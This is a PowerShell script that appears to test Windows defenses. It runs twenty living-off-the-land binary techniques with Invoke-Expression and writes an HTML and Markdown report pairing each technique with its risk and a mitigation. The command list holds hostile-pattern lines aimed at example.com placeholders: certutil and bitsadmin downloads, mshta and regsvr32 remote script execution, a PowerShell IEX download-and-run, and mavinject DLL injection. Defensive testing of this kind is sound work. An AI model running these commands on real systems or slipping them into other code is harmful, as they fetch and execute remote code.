# lolbas_tester.ps1
# Extended LOLBAS tester script (20 tests) with modern styled HTML report

$tests = @(
    @{ Command = 'certutil -urlcache -split -f https://example.com/file.txt file.txt'; Why = 'Can download malicious files over HTTP'; Mitigation = 'Block certutil.exe for standard users' },
    @{ Command = 'bitsadmin /transfer myJob https://example.com/file.txt file.txt'; Why = 'Transfers files silently, often overlooked'; Mitigation = 'Block or audit bitsadmin' },
    @{ Command = 'mshta https://example.com/malware.hta'; Why = 'Executes remote scripts, can bypass defenses'; Mitigation = 'Block mshta.exe with AppLocker' },
    @{ Command = 'regsvr32 /s /n /u /i:https://example.com/file.sct scrobj.dll'; Why = 'Runs remote scriptlets (SCT), no disk footprint'; Mitigation = 'Block regsvr32 or restrict internet access' },
    @{ Command = 'wmic process call create "calc.exe"'; Why = 'Can execute any command or script'; Mitigation = 'Limit wmic usage with group policies' },
    @{ Command = 'rundll32 url.dll,FileProtocolHandler https://example.com'; Why = 'Can open URLs silently'; Mitigation = 'Restrict rundll32 usage' },
    @{ Command = 'powershell -Command "IEX (New-Object Net.WebClient).DownloadString(''https://example.com/script.ps1'')"'; Why = 'Download & execute remote PowerShell scripts'; Mitigation = 'Constrain PowerShell, enable AMSI' },
    @{ Command = 'forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe'; Why = 'Abuses forfiles to execute commands'; Mitigation = 'Restrict forfiles.exe' },
    @{ Command = 'installutil /logfile= /LogToConsole=false /U https://example.com/bad.dll'; Why = 'Can execute code via .NET installers'; Mitigation = 'Block installutil.exe for users' },
    @{ Command = 'msbuild badproj.csproj'; Why = 'Compiles and executes malicious code'; Mitigation = 'Block msbuild.exe for standard users' },
    @{ Command = 'cmd /c calc.exe'; Why = 'Direct execution via cmd'; Mitigation = 'Restrict cmd usage where possible' },
    @{ Command = 'cscript //b //e:vbscript https://example.com/bad.vbs'; Why = 'Run remote VBScript files'; Mitigation = 'Block cscript.exe / wscript.exe' },
    @{ Command = 'wscript //b //e:jscript https://example.com/bad.js'; Why = 'Run remote JScript files'; Mitigation = 'Block wscript.exe' },
    @{ Command = 'hh.exe http://example.com/helpfile.chm'; Why = 'Executes HTML help files containing scripts'; Mitigation = 'Block hh.exe' },
    @{ Command = 'mavinject.exe 1234 /INJECTRUNNING bad.dll'; Why = 'Inject DLL into running process'; Mitigation = 'Restrict mavinject to admins' },
    @{ Command = 'dxcap.exe /c capture'; Why = 'Can be abused to load unsigned DLLs'; Mitigation = 'Audit and control usage' },
    @{ Command = 'at /interactive /every:M,T,W,Th,F cmd.exe'; Why = 'Schedules interactive task'; Mitigation = 'Disable at.exe' },
    @{ Command = 'esentutl /y https://example.com/payload.exe'; Why = 'Download file from remote'; Mitigation = 'Restrict esentutl usage' },
    @{ Command = 'makecab.exe file.txt file.cab'; Why = 'Compress & deliver malicious payloads'; Mitigation = 'Audit makecab.exe usage' },
    @{ Command = 'msxsl file.xml transform.xsl'; Why = 'Executes XSL script, can run code'; Mitigation = 'Block msxsl.exe' }
)

# Markdown (jei reikia)
$reportMd = @"
# LOLBAS Test Report

| Command | Status | Why it's dangerous | How to mitigate |
|--------|--------|--------------------|-----------------|
"@

# HTML su moderniu dizainu
$reportHtml = @"
<html>
<head>
<meta charset='utf-8'>
<title>LOLBAS Test Report</title>
<style>
body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #1e2e24; color: #f0f0f0; padding: 30px; }
h1 { text-align: center; color: #9fdf9f; margin-bottom: 20px; }
table { border-collapse: collapse; width: 100%; background: #2d4233; border-radius: 8px; overflow: hidden; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
th { background: #3a5c3a; color: #fff; padding: 12px; }
td { padding: 10px; border-bottom: 1px solid #3a5c3a; }
tr:nth-child(even) { background: #354c39; }
.status-pass { color: #8fff8f; font-weight: bold; }
.status-fail { color: #ff8f8f; font-weight: bold; }
</style>
</head>
<body>
<h1>LOLBAS Test Report</h1>
<table>
<tr><th>Command</th><th>Status</th><th>Why it's dangerous</th><th>How to mitigate</th></tr>
"@

foreach ($test in $tests) {
    try {
        Invoke-Expression $test.Command
        $status = "✅ Passed"
        $statusClass = "status-pass"
    } catch {
        $status = "❌ Failed"
        $statusClass = "status-fail"
    }

    $reportMd += "`n| $($test.Command) | $status | $($test.Why) | $($test.Mitigation) |"
    $reportHtml += "<tr><td>$($test.Command)</td><td class='$statusClass'>$status</td><td>$($test.Why)</td><td>$($test.Mitigation)</td></tr>"
}

$reportHtml += "</table></body></html>"

# Create folder jei reikia
$resultsPath = "../results"
if (-not (Test-Path $resultsPath)) {
    New-Item -ItemType Directory -Path $resultsPath | Out-Null
}

# Save
$reportMd   | Out-File -FilePath "$resultsPath/report.md" -Encoding utf8
$reportHtml | Out-File -FilePath "$resultsPath/report.html" -Encoding utf8

Write-Host "Done! See results/report.html"
